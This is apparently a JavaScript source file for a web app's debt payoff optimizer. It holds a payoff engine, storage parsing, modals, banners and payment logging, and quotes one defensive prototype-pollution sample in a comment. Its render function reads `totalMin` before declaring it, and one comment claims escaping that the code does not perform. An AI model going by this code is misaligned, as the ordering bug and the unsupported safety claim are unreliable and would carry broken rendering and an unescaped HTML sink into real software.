// ─────────────────────────────────────────────────────────────────────────────
// CROSS-PAGE CONTRACT (D-XDEP-1 audit 2026-05-24)
// ─────────────────────────────────────────────────────────────────────────────
// Schema written to PFCStorage key `debts` (namespaced `pfc:{uid}:debts`).
// Each entry is an object with at minimum:
//   id      — stable string from `_mintDebtId()` (D-P0-1, persisted, never reused).
//   name    — display name (must be escHtml'd at every sink).
//   balance — Number (cleaned via `_parseFiniteAmount` at save).
//   rate    — Number (annual APR %, 0-100, validated at save).
//   minPay  — Number (monthly minimum, validated at save).
//   type    — enum into TYPE_COLORS (credit_card / personal_loan / car_loan /
//             student_loan / mortgage / other).
//
// **Cross-page consumer**: `js/inline/dashboard-2.js` reads `{name, balance,
// rate, minPay}` to compute the dashboard's debt summary. It also accepts the
// legacy field name `minimum` as a fallback (for cross-tool drift with
// /tools/debt-strategy — see D-WORTH-2 block below). DO NOT rename `minPay`
// without updating dashboard's reader AND keeping the fallback alive.
//
// `debt_strategy` storage key: single-writer (this file only). Plain string.
// ─────────────────────────────────────────────────────────────────────────────

// ─────────────────────────────────────────────────────────────────────────────
// CROSS-TOOL DRIFT WARNING (D-WORTH-2 CEO call 2026-05-24)
// ─────────────────────────────────────────────────────────────────────────────
// `tools/debt-strategy.html` + `js/tools/debt-strategy-compare.js` host a
// PARALLEL engine for the same problem with DIFFERENT field names:
//   - This file: `rate`, `minPay`
//   - /tools file: `apr`, `minimum`
// This is INTENTIONAL: /tools is the unauth SEO funnel (Google-indexed,
// `isAccessibleForFree: true`, no save); this is the logged-in deep tool
// with persistent storage + Pro features. Do NOT consolidate without
// explicit operator approval — the SEO page is indexed and any URL or
// field rename hits search rankings. Mirror block lives at the top of
// `js/tools/debt-strategy-compare.js`.
// ─────────────────────────────────────────────────────────────────────────────

// ── STATE ──
let DEBTS = [];
let STRATEGY = 'avalanche';
let EXTRA = 0;
let editingId = '';      // D-P0-1: stable id (was: editIdx array index)
let editIdx = -1;        // legacy fallback for any external caller
let payoffChart = null;
let USER = {};
let SCHEDULE_DATA = [];

// D-P0-1 helper (audit 2026-05-24) — stable id minting. Pre-fix debt entries
// were array-position keyed; sort/reorder/concurrent-rehydrate could de-sync
// edit/delete to the wrong debt. Same fix pattern as R-P0-1 on /recurring.
function _mintDebtId() {
  return 'd_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
}

// D-SEC-13 helper — prototype-pollution-safe JSON parse. Pre-fix a tampered
// localStorage payload `{"__proto__":{"polluted":true}}` mutated
// Object.prototype on every load. Reviver drops the reserved keys. Same
// pattern as R-SEC-17 on /recurring.
function _safeParseJson(str) {
  try {
    return JSON.parse(str, (k, v) => {
      if (k === '__proto__' || k === 'constructor' || k === 'prototype') return undefined;
      return v;
    });
  } catch (_) { return null; }
}

// D-BUG-10 + D-SEC-15 fix (audit 2026-05-24) — replace native confirm()/alert()
// with promise-based modal helpers. Pre-fix the `confirm("Delete '...'?")` at
// deleteDebtById and `alert("Minimum payment...")` at saveDebt were silently
// no-op in iOS standalone PWA mode → user thought delete worked when it
// didn't, or never saw the validation error. Mirrors NW-P1-6 / G-P1-D /
// R-P0-9 pattern. Markup at #debt-confirm-modal in debt-optimizer.html.
let _pfcModalActive = false;
function _pfcConfirm(message, okLabel) {
  return new Promise((resolve) => {
    if (_pfcModalActive) { resolve(false); return; }
    _pfcModalActive = true;
    const modal = document.getElementById('debt-confirm-modal');
    const msgEl = document.getElementById('debt-confirm-msg');
    const okBtn = document.getElementById('debt-confirm-ok');
    const cancelBtn = document.getElementById('debt-confirm-cancel');
    if (!modal || !msgEl || !okBtn || !cancelBtn) {
      // Fallback if markup missing — preserves behaviour but warns once.
      _pfcModalActive = false;
      resolve(window.confirm(message));
      return;
    }
    const previousFocus = document.activeElement;
    msgEl.textContent = message;
    okBtn.textContent = okLabel || 'Confirm';
    cancelBtn.style.display = '';
    modal.classList.add('open');
    okBtn.focus();
    function cleanup(result) {
      modal.classList.remove('open');
      okBtn.removeEventListener('click', onOk);
      cancelBtn.removeEventListener('click', onCancel);
      document.removeEventListener('keydown', onKey);
      _pfcModalActive = false;
      try { if (previousFocus && previousFocus.focus) previousFocus.focus(); } catch (_) {}
      resolve(result);
    }
    function onOk() { cleanup(true); }
    function onCancel() { cleanup(false); }
    function onKey(e) {
      if (e.key === 'Escape') cleanup(false);
      if (e.key === 'Enter') cleanup(true);
    }
    okBtn.addEventListener('click', onOk);
    cancelBtn.addEventListener('click', onCancel);
    document.addEventListener('keydown', onKey);
  });
}
function _pfcAlert(message) {
  return new Promise((resolve) => {
    if (_pfcModalActive) { resolve(); return; }
    _pfcModalActive = true;
    const modal = document.getElementById('debt-confirm-modal');
    const msgEl = document.getElementById('debt-confirm-msg');
    const okBtn = document.getElementById('debt-confirm-ok');
    const cancelBtn = document.getElementById('debt-confirm-cancel');
    if (!modal || !msgEl || !okBtn) {
      _pfcModalActive = false;
      resolve(window.alert(message));
      return;
    }
    const previousFocus = document.activeElement;
    msgEl.textContent = message;
    okBtn.textContent = 'OK';
    if (cancelBtn) cancelBtn.style.display = 'none';
    modal.classList.add('open');
    okBtn.focus();
    function cleanup() {
      modal.classList.remove('open');
      if (cancelBtn) cancelBtn.style.display = '';
      okBtn.removeEventListener('click', onOk);
      document.removeEventListener('keydown', onKey);
      _pfcModalActive = false;
      try { if (previousFocus && previousFocus.focus) previousFocus.focus(); } catch (_) {}
      resolve();
    }
    function onOk() { cleanup(); }
    function onKey(e) { if (e.key === 'Escape' || e.key === 'Enter') cleanup(); }
    okBtn.addEventListener('click', onOk);
    document.addEventListener('keydown', onKey);
  });
}

// D-BUG-7 helper — strict numeric input validation. parseFloat accepts
// scientific notation ("5e10" → 50000000000) and "Infinity" strings. We
// reject anything not a plain decimal string in human range so localStorage
// can't be poisoned by paste-bombs that overflow chart axes or balloon JSON.
function _parseFiniteAmount(raw, maxValue) {
  const str = String(raw == null ? '' : raw).trim();
  // Reject scientific notation explicitly (allow optional minus, digits, dot).
  if (!/^-?\d*\.?\d+$/.test(str)) return null;
  const n = parseFloat(str);
  if (!Number.isFinite(n)) return null;
  if (n < 0) return null;
  if (typeof maxValue === 'number' && n > maxValue) return null;
  return n;
}

// D-P0-1 — backfill stable ids for any pre-rollout debt entry without one.
function _backfillDebtIds() {
  let needsSave = false;
  DEBTS.forEach(d => {
    if (!d.id) { d.id = _mintDebtId(); needsSave = true; }
  });
  if (needsSave) { try { PFCStorage.setJSON('debts', DEBTS); } catch (_) {} }
}

const TYPE_COLORS = {
  credit_card:   { color: '#E05252', label: '💳 Credit card' },
  personal_loan: { color: '#F5A623', label: '🏦 Personal loan' },
  car_loan:      { color: '#3B82F6', label: '🚗 Car loan' },
  student_loan:  { color: '#A78BFA', label: '🎓 Student loan' },
  mortgage:      { color: '#22C55E', label: '🏠 Mortgage' },
  other:         { color: '#B8C2BC', label: '📄 Other' },
};

// ── INIT ──
function init() {
  try { USER = (typeof PFCUser !== 'undefined') ? PFCUser.get() : (PFCStorage.getJSON('user') || {}); } catch(e) { USER = {}; }
  // D-SEC-13: prototype-pollution-safe parse.
  try {
    const saved = PFCStorage.get('debts');
    const parsed = saved ? _safeParseJson(saved) : null;
    DEBTS = Array.isArray(parsed) ? parsed : [];
  } catch(e) { DEBTS = []; }
  try { STRATEGY = PFCStorage.get('debt_strategy') || 'avalanche'; } catch(e) {}

  // D-P0-1: backfill stable ids on legacy entries lacking one.
  _backfillDebtIds();

  // Load USER debts from dashboard if DEBTS is empty (one-time migration)
  if (!DEBTS.length && USER.debt > 0) {
    DEBTS = [{
      id: _mintDebtId(),  // D-P0-1: mint id on the migrated stub
      name: 'My debt',
      balance: USER.debt || 0,
      rate: 10,
      minPay: USER.debtPay || Math.max(50, Math.round((USER.debt || 0) * 0.02)),
      type: 'other',
    }];
    saveDebts();
  }

  const sym = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
  document.getElementById('m-sym').textContent = sym;

  // Sidebar user-pill hydrated by js/pfc-sidebar.js;
  // plan badge by PFCPlan.applyBadges().

  // Set strategy buttons
  setStrategy(STRATEGY, false);

  // Set extra slider max based on user surplus
  const surplus = Math.max(500, Math.round(((USER.income||0) + (USER.otherIncome||0)) -
    ((USER.housing||0) + (USER.food||0) + (USER.transport||0) + (USER.otherExp||0) + (USER.debtPay||0))));
  document.getElementById('extra-slider').max = Math.max(1000, surplus);

  renderAll();
}

function saveDebts() {
  PFCStorage.setJSON('debts', DEBTS);
}

// ── STRATEGY ──
function setStrategy(s, recalc = true) {
  STRATEGY = s;
  PFCStorage.set('debt_strategy', s);
  const avBtn = document.getElementById('strat-avalanche');
  const snBtn = document.getElementById('strat-snowball');
  // D-P0-9 — flip aria-checked in lockstep with .active so SR users hear
  // which strategy is selected. Buttons are now role=radio in a radiogroup.
  if (avBtn) {
    avBtn.classList.toggle('active', s === 'avalanche');
    avBtn.setAttribute('aria-checked', s === 'avalanche' ? 'true' : 'false');
  }
  if (snBtn) {
    snBtn.classList.toggle('active', s === 'snowball');
    snBtn.setAttribute('aria-checked', s === 'snowball' ? 'true' : 'false');
  }
  document.getElementById('debt-order-hint').textContent =
    s === 'avalanche' ? 'Ordered: highest interest rate first' : 'Ordered: lowest balance first';
  // D-A11Y-9 — announce strategy change to SR users via live region.
  _srAnnounce(s === 'avalanche'
    ? 'Strategy switched to Avalanche — highest interest rate first.'
    : 'Strategy switched to Snowball — lowest balance first.');
  if (recalc) renderAll();
}

// D-WORTH-1 ship (CEO call 2026-05-24) — Pro PDF plan via window.print().
// Soft paywall for Free users (matches the /recurring Sage paywall pattern):
// don't block the page; surface a confirm modal explaining the Pro pull and
// routing to billing.html. Pro/Founders go straight to the browser's
// native print → "Save as PDF". Print stylesheet (see <style> @media print)
// strips chrome and brands the output.
async function printDebtPlan() {
  const isPaid = (typeof PFCEntitlements !== 'undefined') && PFCEntitlements.isPaid();
  if (!isPaid) {
    // D-BUG-10 follow-up — was using native window.confirm(), which is silently
    // no-op in iOS PWA standalone mode (the same iOS-PWA-broken behaviour we
    // fixed for deleteDebtById + saveDebt). Now routes through _pfcConfirm
    // (which renders the existing #debt-confirm-modal markup) so the Pro
    // upsell actually opens for iOS Add-to-Home-Screen users.
    const goPro = await _pfcConfirm(
      'Branded PDF plan is a Pro feature. Pro (€9/mo) or Founders Lifetime (€39 one-time) unlocks the printable plan you can share with your partner or take to your bank, plus full CSV-history export on /recurring. Continue to billing?',
      'See Pro plans'
    );
    if (goPro) { try { window.location.href = 'billing.html'; } catch (_) {} }
    return;
  }
  // Inject a brand header before printing so the PDF carries the wordmark + date.
  let header = document.querySelector('.pfc-print-header');
  if (!header) {
    header = document.createElement('div');
    header.className = 'pfc-print-header';
    header.innerHTML = '<div style="font-family:Fraunces,Georgia,serif;font-size:22px;font-weight:700;">ProFinanceCast · Debt strategy plan</div>' +
      '<div style="font-size:12px;color:#666;margin-top:4px;">Generated ' + new Date().toLocaleDateString('en-GB',{day:'numeric',month:'long',year:'numeric'}) + ' · Use your browser’s Print dialog and choose “Save as PDF”.</div>';
    const main = document.querySelector('.main') || document.body;
    main.insertBefore(header, main.firstChild);
  }
  try { window.print(); } catch (_) {}
}
// Free users get the Pro badge hidden once entitlements resolve as paid.
function _hidePdfProBadgeIfPaid() {
  try {
    if (typeof PFCEntitlements !== 'undefined' && PFCEntitlements.isPaid()) {
      const badge = document.getElementById('pdf-pro-badge');
      if (badge) badge.style.display = 'none';
    }
  } catch (_) {}
}

// ── EXTRA SLIDER ──
// D-PERF-5 fix (audit 2026-05-24) — debounce renderAll. Pre-fix the slider's
// native `input` event fired ~40× during a single drag (0→1000 at $25 step),
// each firing a full renderAll → 5× calcPayoff + chart destroy/recreate.
// Now we update the on-screen `+$N` label IMMEDIATELY (so the user sees
// drag responsiveness) but debounce the heavy render to settle in 80ms.
// Same pattern as R-PERF-9 sortCards debounce.
// D-A11Y-7 — also update slider's aria-valuetext + announce via live region
// (debounced once settled, otherwise SR would spam).
let _extraRenderDebounce = null;
let _extraAnnounceDebounce = null;
function updateExtra(val) {
  EXTRA = parseInt(val) || 0;
  const sym = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
  document.getElementById('extra-val').textContent = '+' + sym + EXTRA.toLocaleString();
  // D-A11Y-7 — bind aria-valuetext on the slider live (cheap).
  const slider = document.getElementById('extra-slider');
  if (slider) slider.setAttribute('aria-valuetext', '+' + sym + EXTRA.toLocaleString() + ' per month');
  if (_extraRenderDebounce) clearTimeout(_extraRenderDebounce);
  _extraRenderDebounce = setTimeout(() => renderAll(), 80);
  // D-A11Y-9 — announce settled value to SR after a longer beat so the
  // user isn't bombarded mid-drag.
  if (_extraAnnounceDebounce) clearTimeout(_extraAnnounceDebounce);
  _extraAnnounceDebounce = setTimeout(() => _srAnnounce(`Extra payment now ${sym}${EXTRA.toLocaleString()} per month`), 400);
}

// ── CORE CALCULATION ENGINE ──
// Returns { months, totalInterest, totalPaid, schedule, perDebt }
function calcPayoff(debts, strategy, extra) {
  if (!debts.length) return null;

  // Clone debts
  let pool = debts.map((d, i) => ({
    ...d,
    remaining: d.balance,
    idx: i,
    totalInterestPaid: 0,
    clearedMonth: null,
  }));

  // Sort by strategy
  const sorted = [...pool].sort((a, b) =>
    strategy === 'avalanche'
      ? b.rate - a.rate          // highest rate first
      : a.remaining - b.remaining // lowest balance first
  );

  // D-P0-5 fix (audit 2026-05-24) — detect negative-amortisation upfront:
  // any debt whose monthly interest exceeds its minimum payment. Pre-fix
  // such a debt grew unbounded to the 600-month cap and the UI silently
  // reported "600 mo / Debt-free by [date]" with no warning. Return the
  // list so renderAll can surface a banner.
  const negAmortDebts = pool
    .filter(d => d.balance > 0 && (d.balance * (d.rate / 100 / 12)) > d.minPay)
    .map(d => ({ name: d.name, monthlyInterest: Math.round(d.balance * (d.rate / 100 / 12)), minPay: d.minPay }));

  const schedule = [];
  let month = 0;
  const maxMonths = 600; // 50 years cap

  // D-PERF-9 fix (audit 2026-05-24) — hoist the base Date outside the loop.
  // Pre-fix every iteration did `new Date()` + `setMonth(getMonth() + month)`
  // + `toLocaleDateString()`. With 600-month cap × 3 calls per render ×
  // debounced settle, this is thousands of Date allocations and locale-
  // format calls per slider settle. Now we hold ONE base Date (today) and
  // produce per-iteration dates via the 3-arg Date constructor — same
  // accuracy, dramatically less GC pressure.
  const baseYear = new Date().getFullYear();
  const baseMonth = new Date().getMonth();

  while (pool.some(d => d.remaining > 0.01) && month < maxMonths) {
    month++;
    const date = new Date(baseYear, baseMonth + month, 1);
    const dateStr = date.toLocaleDateString('en-GB', { month:'short', year:'numeric' });

    let monthlyExtra = extra;
    let totalPayment = 0;
    let event = '';

    // Apply interest to all active debts
    pool.forEach(d => {
      if (d.remaining <= 0) return;
      const interest = d.remaining * (d.rate / 100 / 12);
      d.remaining += interest;
      d.totalInterestPaid += interest;
    });

    // Pay minimums on all
    pool.forEach(d => {
      if (d.remaining <= 0) return;
      const pay = Math.min(d.minPay, d.remaining);
      d.remaining -= pay;
      d.remaining = Math.max(0, d.remaining);
      totalPayment += pay;
    });

    // D-P0-3 fix (audit 2026-05-24) — cascade loop. Pre-fix the apply-extra
    // loop broke when monthlyExtra hit 0, and the freed-minimum harvester
    // ran AFTER, adding to a local `monthlyExtra` that went out of scope
    // before the next iteration. Snowball/avalanche cascade NEVER landed.
    // Restructured as a loop that alternates apply-extra + harvest-freed
    // until both stabilise (nothing applied AND nothing newly harvested).
    let cascadeSafety = pool.length + 2; // bounded by total debt count
    while (cascadeSafety-- > 0) {
      let applied = false;
      for (const sd of sorted) {
        const d = pool.find(x => x.idx === sd.idx);
        if (!d || d.remaining <= 0) continue;
        if (monthlyExtra <= 0) break;
        const extra_applied = Math.min(monthlyExtra, d.remaining);
        d.remaining -= extra_applied;
        d.remaining = Math.max(0, d.remaining);
        totalPayment += extra_applied;
        monthlyExtra -= extra_applied;
        applied = true;
      }

      // Harvest freshly-cleared debts' minimums and feed back into pool.
      let harvested = false;
      pool.forEach(d => {
        if (d.remaining <= 0 && d.clearedMonth === null) {
          d.clearedMonth = month;
          event += (event ? ', ' : '') + d.name + ' cleared.';
          monthlyExtra += d.minPay;
          harvested = true;
        }
      });

      // Exit the cascade when nothing changes — both strategies converge.
      if (!applied && !harvested) break;
      // Optimisation: also exit if no extra remains AND nothing harvested
      // (no more cascade possible this month).
      if (monthlyExtra <= 0 && !harvested) break;
    }

    const totalRemaining = pool.reduce((s, d) => s + Math.max(0, d.remaining), 0);
    schedule.push({ month, date: dateStr, payment: Math.round(totalPayment), balance: Math.round(totalRemaining), event });
  }

  const totalInterest = pool.reduce((s, d) => s + d.totalInterestPaid, 0);
  const totalPaid = pool.reduce((s, d) => s + d.balance, 0) + totalInterest;

  return {
    months: month,
    totalInterest: Math.round(totalInterest),
    totalPaid: Math.round(totalPaid),
    schedule,
    perDebt: pool,
    // D-P0-5: surface failure mode so renderAll can banner it.
    failedToConverge: month >= maxMonths && pool.some(d => d.remaining > 0.01),
    negAmortDebts,
  };
}

// ── RENDER ALL ──
function renderAll() {
  const sym = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
  const hasDebts = DEBTS.length > 0;

  document.getElementById('empty-debts').style.display = hasDebts ? 'none' : 'block';
  document.getElementById('payoff-order-card').style.display = hasDebts ? 'block' : 'none';

  if (!hasDebts) {
    ['m-total','m-months','m-saved','m-payment'].forEach(id => document.getElementById(id).textContent = '—');
    document.getElementById('compare-body').innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--text3);padding:24px 0;">Add debts to see comparison</td></tr>';
    document.getElementById('sched-body').innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text3);padding:24px 0;">Add debts to see schedule</td></tr>';
    renderChart(null, null);
    return;
  }

  // D-PERF-6 fix (audit 2026-05-24) — dedupe redundant calcPayoff calls.
  // Pre-fix: 5 calls per render (opt, base, aval, snow, noExtra). But
  //   - `base` and `noExtra` are IDENTICAL (both: STRATEGY + extra=0)
  //   - `aval` === `opt` when STRATEGY === 'avalanche'
  //   - `snow` === `opt` when STRATEGY === 'snowball'
  // So real work is at most 3 calls (opt + base + the OTHER strategy).
  // For an aggressive slider drag (D-PERF-5 debounce coalesces but each
  // settled render now does 3 full sims instead of 5 — 40% fewer).
  const opt    = calcPayoff(DEBTS, STRATEGY, EXTRA);
  const base   = calcPayoff(DEBTS, STRATEGY, 0);
  const aval   = STRATEGY === 'avalanche' ? opt : calcPayoff(DEBTS, 'avalanche', EXTRA);
  const snow   = STRATEGY === 'snowball'  ? opt : calcPayoff(DEBTS, 'snowball',  EXTRA);
  const noExtra = base; // identical: same strategy + extra=0

  SCHEDULE_DATA = opt.schedule;

  // D-CRO-12 fix (CEO call 2026-05-24) — DTI (debt-to-income) micro-banner.
  // Reads USER.income (already loaded for slider max). Renders ONLY when
  // income > 0 — silent skip on zero/missing so guests/users who skipped
  // income onboarding don't see a "?%" pill. Single-line conversion-grade
  // anchor that turns this from a tactical tool into a strategic dashboard
  // moment. Heavy-version (breakdown card + national average) deferred per
  // CEO scope.
  _renderDtiBanner(totalMin, sym);

  // D-P0-5 fix (audit 2026-05-24) — negative-amortisation banner. If any
  // debt's monthly interest exceeds its minimum payment, the projection at
  // the current minimums never converges (was silently capped at 600 mo).
  // Surface a red banner naming the offending debt(s) and the gap so the
  // user knows their minimum is mathematically insufficient.
  _renderNegAmortBanner(opt, sym);

  // Summary strip
  const totalDebt = DEBTS.reduce((s, d) => s + d.balance, 0);
  const totalMin  = DEBTS.reduce((s, d) => s + d.minPay, 0);
  document.getElementById('m-total').textContent = sym + Math.round(totalDebt).toLocaleString();
  document.getElementById('m-total-hint').textContent = `across ${DEBTS.length} debt${DEBTS.length!==1?'s':''}`;

  const debtFreeDate = new Date();
  debtFreeDate.setMonth(debtFreeDate.getMonth() + opt.months);
  const dfStr = debtFreeDate.toLocaleDateString('en-GB', { month: 'short', year: 'numeric' });
  document.getElementById('m-months').textContent = opt.months + ' mo';
  document.getElementById('m-months-hint').textContent = 'Debt-free by ' + dfStr;

  // D-BUG-14 fix (audit 2026-05-24) — `interestSaved` was declared but never
  // read; `saved` is the value used downstream. Pre-fix it sat as dead code
  // computing the same thing with extra branching. Removed.
  const saved = base.totalInterest - opt.totalInterest;
  document.getElementById('m-saved').textContent = sym + Math.max(0, Math.round(saved)).toLocaleString();
  document.getElementById('m-payment').textContent = sym + (totalMin + EXTRA).toLocaleString();
  document.getElementById('m-payment-hint').textContent = sym + totalMin.toLocaleString() + ' min + ' + sym + EXTRA.toLocaleString() + ' extra';

  // D-CRO-1 fix (CEO call 2026-05-24) — "since last visit" pill. Stamps
  // `debts_lastSeen` and surfaces a humanised delta in the topbar so the
  // user sees freshness anchor on every return. Same pattern as R-CRO-3
  // on /recurring (and DASH-P1-4 on dashboard).
  let stalenessTail = '';
  try {
    const stamp = Number(PFCStorage.getJSON('debts_lastSeen')) || 0;
    if (stamp > 0) {
      const days = Math.max(0, Math.floor((Date.now() - stamp) / 86400000));
      if (days === 0) stalenessTail = ' · viewed today';
      else if (days === 1) stalenessTail = ' · viewed yesterday';
      else if (days < 14) stalenessTail = ` · viewed ${days} days ago`;
      else if (days < 60) stalenessTail = ` · viewed ${Math.floor(days/7)} weeks ago — log progress?`;
      else stalenessTail = ` · viewed ${Math.floor(days/30)} months ago — balances may be stale`;
    }
    // Stamp now AFTER reading, so the next render shows the right delta.
    PFCStorage.setJSON('debts_lastSeen', Date.now());
  } catch (_) {}

  // Topbar
  document.getElementById('topbar-sub').textContent =
    `${DEBTS.length} debt${DEBTS.length!==1?'s':''} · ${sym}${Math.round(totalDebt).toLocaleString()} total · debt-free by ${dfStr}${stalenessTail}`;

  // Extra impact boxes
  if (EXTRA > 0) {
    const monthsFaster = Math.max(0, noExtra.months - opt.months);
    const intSaved = Math.max(0, noExtra.totalInterest - opt.totalInterest);
    document.getElementById('imp-months').textContent = monthsFaster || '0';
    document.getElementById('imp-interest').textContent = sym + Math.round(intSaved).toLocaleString();
    document.getElementById('imp-date').textContent = dfStr;
  } else {
    document.getElementById('imp-months').textContent = '—';
    document.getElementById('imp-interest').textContent = '—';
    document.getElementById('imp-date').textContent = dfStr;
  }

  // Debt list
  renderDebtList(opt, sym);

  // Chart
  renderChart(opt, base);

  // Comparison table
  renderComparison(aval, snow, sym);

  // Schedule
  renderSchedule(opt.schedule, sym);

  // Payoff order breakdown
  renderPayoffOrder(opt, sym);
}

// D-P0-5 fix — render the negative-amortisation warning banner. Idempotent;
// removes itself when no problem detected. Uses textContent for name to
// avoid any XSS surface even though d.name is already trusted by this stage.
function _renderNegAmortBanner(opt, sym) {
  const existing = document.getElementById('neg-amort-banner');
  if (existing) existing.remove();
  if (!opt || !opt.negAmortDebts || !opt.negAmortDebts.length) return;
  const wrap = document.querySelector('.summary-strip');
  if (!wrap) return;
  const banner = document.createElement('div');
  banner.id = 'neg-amort-banner';
  banner.setAttribute('role', 'alert');
  banner.style.cssText = 'grid-column:1/-1;background:rgba(224,82,82,0.08);border:1px solid rgba(224,82,82,0.3);border-radius:var(--r);padding:14px 18px;margin-bottom:14px;display:flex;align-items:flex-start;gap:12px;';
  // Build name list via textContent so even a tampered storage payload can't
  // break out of the banner template.
  const names = opt.negAmortDebts.map(d => d.name).join(', ');
  const gap = opt.negAmortDebts.reduce((s, d) => s + (d.monthlyInterest - d.minPay), 0);
  banner.innerHTML = `
    <div style="font-size:18px;line-height:1;">⚠️</div>
    <div style="flex:1;font-size:13px;line-height:1.55;color:var(--text);font-family:var(--font-body);">
      <strong style="color:var(--red);">Your minimum isn't enough.</strong>
      <span class="neg-amort-names" style="font-weight:600;"></span>
      ${opt.negAmortDebts.length > 1 ? 'are each' : 'is'} accruing more interest than the minimum payment covers — the balance is growing, not shrinking.
      You need at least <strong>${sym}${gap.toLocaleString()}/mo</strong> in additional payments just to break even. Drag the extra-payment slider above or raise the minimum on the affected debt.
    </div>`;
  // textContent the names safely.
  const nameEl = banner.querySelector('.neg-amort-names');
  if (nameEl) nameEl.textContent = ' ' + names + ' ';
  wrap.parentNode.insertBefore(banner, wrap);
}

// D-CRO-12 helper (CEO call 2026-05-24) — DTI banner. Single-line micro-stat
// anchoring "total minimums / monthly income" against the canonical 36%
// comfort threshold. Silent skip when income missing/zero/non-finite so
// guests or users who skipped onboarding don't see a "?% of ?" line. dtiPct
// capped at 999 for display (a paste-bomb balance shouldn't crash the line).
function _renderDtiBanner(totalMin, sym) {
  const wrap = document.getElementById('dti-banner-wrap');
  if (!wrap) return;
  wrap.innerHTML = '';
  const income = Number(USER && USER.income) || 0;
  if (!Number.isFinite(income) || income <= 0) return;
  if (!Number.isFinite(totalMin) || totalMin <= 0) return;
  const dtiPct = Math.min(999, Math.round((totalMin / income) * 100));
  let tone, msg;
  if (dtiPct <= 28) {
    tone = 'good';
    msg = `<strong>Healthy DTI</strong> — well under the 36% comfort threshold. Keep the extras coming and you'll stay there.`;
  } else if (dtiPct <= 36) {
    tone = 'warn';
    msg = `<strong>Approaching the 36% comfort threshold.</strong> Extra payments on the highest-rate debt are the cheapest way back into safe territory.`;
  } else {
    tone = 'bad';
    msg = `<strong>Above the 36% comfort threshold.</strong> Refinancing the highest-rate debt or adding to monthly payments could ease this fast.`;
  }
  const banner = document.createElement('div');
  banner.className = 'dti-banner dti-banner--' + tone;
  banner.setAttribute('role', 'status');
  // sym is pre-escaped at init (D-P0-8); dtiPct + totalMin are numeric;
  // msg is a static template literal (no user data). HTML interpolation
  // is safe here — defence-in-depth: msg is built from hardcoded strings,
  // and the only dynamic bits are numbers.
  banner.innerHTML = `<span style="font-size:18px;line-height:1;">📊</span><div style="flex:1;">Your <span class="dti-pct">${dtiPct}%</span> debt-to-income (${sym}${Math.round(totalMin).toLocaleString()}/mo of ${sym}${Math.round(income).toLocaleString()}/mo income). ${msg}</div>`;
  wrap.appendChild(banner);
}

// D-A11Y-9 helper — announce a transient message to the SR live region.
// Markup at #sr-announce in debt-optimizer.html (role=status aria-live=polite).
function _srAnnounce(message) {
  const el = document.getElementById('sr-announce');
  if (!el) return;
  // Briefly clear then set so identical successive messages still announce.
  el.textContent = '';
  setTimeout(() => { el.textContent = message; }, 30);
}

// D-CRO-4 helper (CEO call 2026-05-24) — celebratory toast when a debt is
// cleared (either via deleteDebtById or via D-CRO-2 logPaymentById dropping
// balance to ≤0). Variant 'success' tints the toast teal. Goal-link
// appended ONLY if goals exist in storage AND freed monthly > 0
// (D-CRO-5 lightweight — matches R-CRO-5 pattern on /recurring).
function _celebrateClearedDebt(name, freedMonthly) {
  const sym = USER.sym || (window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$'));
  const goalsRaw = (() => { try { return PFCStorage.get('goals'); } catch (_) { return null; } })();
  const goals = goalsRaw ? _safeParseJson(goalsRaw) : null;
  const hasGoals = Array.isArray(goals) && goals.length > 0;
  if (freedMonthly > 0 && hasGoals) {
    // HTML-mode toast so we can embed a routing link. Name is escaped at the
    // sink because deleteDebt's caller validated d.name but defence-in-depth.
    const msg = `🎉 Cleared ${escHtml(name)} — freed ${sym}${freedMonthly}/mo cashflow. <a href="goals.html" style="color:var(--teal);text-decoration:underline;">Apply ${sym}${freedMonthly}/mo to a goal →</a>`;
    _showCelebrationToast(msg, 'html');
  } else if (freedMonthly > 0) {
    _showCelebrationToast(`🎉 Cleared ${name} — freed ${sym}${freedMonthly}/mo cashflow.`);
  } else {
    _showCelebrationToast(`🎉 Cleared ${name}.`);
  }
  _srAnnounce(`Debt cleared. ${name} removed.`);
}
// Toast variant supporting opt-in HTML mode (D-CRO-5 link) — defaults to
// textContent for safety. Reuses single element + variant tinting like the
// /recurring R-CRO-10 pattern.
let _celebrationTimer = null;
function _showCelebrationToast(msg, mode) {
  let t = document.getElementById('pfc-celebrate-toast');
  if (!t) {
    t = document.createElement('div');
    t.id = 'pfc-celebrate-toast';
    t.className = 'toast toast--success';
    t.setAttribute('role', 'status');
    t.setAttribute('aria-live', 'polite');
    document.body.appendChild(t);
  }
  if (mode === 'html') { t.innerHTML = msg; t.style.pointerEvents = 'auto'; }
  else { t.textContent = msg; t.style.pointerEvents = ''; }
  t.style.opacity = '1'; t.style.transition = '';
  if (_celebrationTimer) clearTimeout(_celebrationTimer);
  // Hold longer when a clickable link is present.
  const holdMs = mode === 'html' ? 6000 : 3500;
  _celebrationTimer = setTimeout(() => {
    t.style.transition = 'opacity .3s'; t.style.opacity = '0';
  }, holdMs);
}

// D-CRO-2 (CEO call 2026-05-24) — one-tap log-payment affordance. Decrements
// `d.balance` by `d.minPay` (or whatever fraction remains, floored at 0),
// re-saves, re-renders, fires confirmation toast. If the payment clears the
// debt entirely, falls through to _celebrateClearedDebt.
function logPaymentById(id) {
  if (!id) return;
  const d = DEBTS.find(x => x.id === id);
  if (!d) return;
  const minPay = Number(d.minPay) || 0;
  if (minPay <= 0) return;
  const sym = USER.sym || (window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$'));
  const before = Number(d.balance) || 0;
  const applied = Math.min(minPay, before);
  const after = Math.max(0, before - applied);
  d.balance = after;
  saveDebts();
  // D-CRO-1 — bump lastSeen so the staleness pill resets on the win moment.
  try { PFCStorage.setJSON('debts_lastSeen', Date.now()); } catch (_) {}
  renderAll();
  if (after <= 0) {
    _celebrateClearedDebt(d.name, minPay);
    // Remove from active list after celebrating — same UX as Delete would
    // produce, but framed as a payoff, not a removal.
    DEBTS = DEBTS.filter(x => x.id !== id);
    saveDebts();
    renderAll();
  } else {
    showToast(`Logged ${sym}${Math.round(applied)} on ${d.name} — new balance ${sym}${Math.round(after).toLocaleString()}`);
    _srAnnounce(`Payment logged on ${d.name}. New balance ${Math.round(after)}.`);
  }
}

